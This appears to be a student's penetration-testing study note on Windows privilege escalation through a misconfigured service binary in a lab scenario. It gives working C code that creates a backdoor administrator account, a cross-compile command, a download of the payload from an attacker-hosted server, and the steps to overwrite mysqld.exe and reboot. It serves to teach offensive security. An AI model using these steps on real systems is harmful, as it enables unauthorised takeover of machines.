
# Hijacking Service Binaries
Each [windows service](windows-services.md) *has an associated binary* which executes when the service is started or transitioned to a running state. 

When service binaries are created (by developers) there's the chance they *misconfigure* the binary's permissions. For example, they could accidentally allow read and write access to all members in the same group as the executing user. This would cause the binary to be vulnerable to *hijacking* where a lower-privileged user in the same group can replace (over*Write*) the binary with a malicious one.

Upon restarting the service, the new malicious binary would execute with the privileges of the original service. 
## Scenario
> [!Note]
> For this scenario, continue to assume we are connected to the victim machine w/ hostname `CLIENTWK220` as the user `dave` (as in the other sections of the windows privesc notes). Assume we've connected to the client box via [RDP](../../../networking/protocols/RDP.md) and that the privesc vectors we used in the other notes are not in play here.
### Discovering Installed Services
To get a listing of all of the services installed on our victim machine, we can use the GUI snap-in `services.msc`, the `Get-Service` cmdlet thru [PowerShell](../../../coding/languages/powershell.md), or the `Get-CimInstance` cmdlet.
#### `Get-CimInstance`
`Get-CimInstance` will query the WMI class [**win32_service**](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-classes). Since we want to know the name, current state and path for the listed binaries, we can pipe the output to `Select` with the arguments `Name`, `State`, and `PathName`.

We can then pipe that to `WhereObject` to *only show binaries which are in a running state*:
```powershell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                      State   PathName
----                      -----   --------
Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Audiosrv                  Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
BFE                       Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
...
mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
...
```
The listed services are installed in either `C:\xampp` or `C:\Windows\system32`. When a binary is installed in `\xampp`  that usually indicates that it is *user-installed* and the service's developer *is in charge of the directory structure as well as the binary's permissions*. These are **PRIME TARGETS** for binary hijacking (if the developer mis-configured their permissions). 
### Enumerating Service Permissions
To find out what the permissions are for the two `\xampp` binaries, we can use either the `icacls` [Windows](../../../computers/windows/README.md) utility or the PowerShell cmdlet `Get-ACL`. 
#### `icacls`
The [icacls utility](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) outputs the permissions mask of  whatever principal/ application you feed to it. On Windows, icacls permission masks can be decoded with this table (similar to [Umask Bits](../../../PNPT/PEH/kali-linux/file-permissions.md#Umask%20Bits) on [Linux](../../../computers/linux/README.md)):

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |
As an example, lets run the `icacls` tool on the Apache `httpd.exe` binary:
```powershell
PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)

Successfully processed 1 files; Failed processing 0 files
```
Based on the output, the permissions for `httpd.exe` (from the previous listing) are:
- `BUILTIN\Administrators`: Full access
- `NT AUTHORITY\SYSTEM`: Full access
- `BUILTIN\Users` Read and Execute
- `NT AUTHORITY\Authenticated Users`: Read and Execute

Since our compromised user account is `dave` (who is part of the `BUILTIN\Users` group), we can only read and execute `httpd.exe`. Next, lets check the other `\xampp` binary:
```powershell
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```
**BINGO**! According to the output, `dave` has *full access* to the `mysqld.exe` service binary which means we can perform service hijacking on it by overwriting the file with our own executable
### Writing a Malicious Binary
Now that we have a target service binary, we need to create the malcious binary we want to replace it with. We can write asimple binary using [C](../../../coding/languages/C.md) which creates a new user named `dave2` and adds that user to the local `Administrators` group. Then we'll cross compile it (on our Kali machine) to run on the Windows victim machine. 

Here is our C code:
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
#### Cross Compiling
To cross compile it on our Kali machine to a 64-bit Windows binary, we need to use `mingw-64`. Assume our C file is called `adduser.c`:
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
### Infiltrating the Binary
Now that we've cross compiled `adduser.c` to our Windows binary `adduser.exe` we can transfer it to the victim machine. Again, we can do this with a [python](../../../coding/languages/python/python.md) web server and `iwr` to fetch it from the victim machine:
```powershell
PS C:\Users\dave> iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
```
### Replacing the Binary
We can use `move` on the windows host to overwrite the original `mysqld.exe` service binary with our `adduser.exe` binary. Before overwriting, we should *create a copy* of the original `mysqld.exe` so we can restore it after we've successfully escalated our privileges:
```powershell
PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```
### Executing the Binary
To execute our malicious binary, we need to *restart the service* which we can do using the `net stop` command. **However** there's a chance that we (as `dave`) don't *have permission to stop or start services*:
```powershell
PS C:\Users\dave> net stop mysql
System error 5 has occurred.

Access is denied.
```
If this is the case, then we may be able to force it to restart by *rebooting the machine*. Before rebooting though, we should check if the service has `StartMode` set to `Auto`. We can check by using `Get-CimInstance` again and piping the output to `Select` and then `Where-Object` to narrow down the output:
```powershell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto
```
Since `StartMode` is set to `Auto` that means the service *will restart when we reboot the machine.* **BUT** we also need to check if `dave` has permission to reboot the machine. We can check by using `whoami` with the `/priv` flag:
```powershell
PS C:\Users\dave> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```
In the output above, we're interested in `SeShutdownPrivilege`. It's enough to see that the privilege is listed in the output to know that `dave` can reboot the machine. If it wasn't listed at all, then we would have to wait for the user to reboot the machine *manually* (in other words, ignore that the `State` property reads `Disabled`-- it only indicates that the privilege is not currently enabled for the running process (`whoami`)).
#### Rebooting
To reboot, we can issue the `shutdown` command with the flags `\r` (for reboot) and `\t` (time in seconds):
```powershell
PS C:\Users\dave> shutdown /r /t 0 
```
Once we RDP back in, we can check to see if our malicious service was restarted via the reboot. Since our binary added a new admin `dave2`, we can confirm via `Get-LocalGroupMember`:
```powershell
PS C:\Users\dave> Get-LocalGroupMember administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local
```
The output shows that our binary successfully created the `dave2` admin account. Yay!
## Automated Options
Check out the [PowerUp.ps1](powerUp-ps1.md) notes.


> [!Resources]
> - [**win32_service**](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-classes)
> - [icacls utility](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.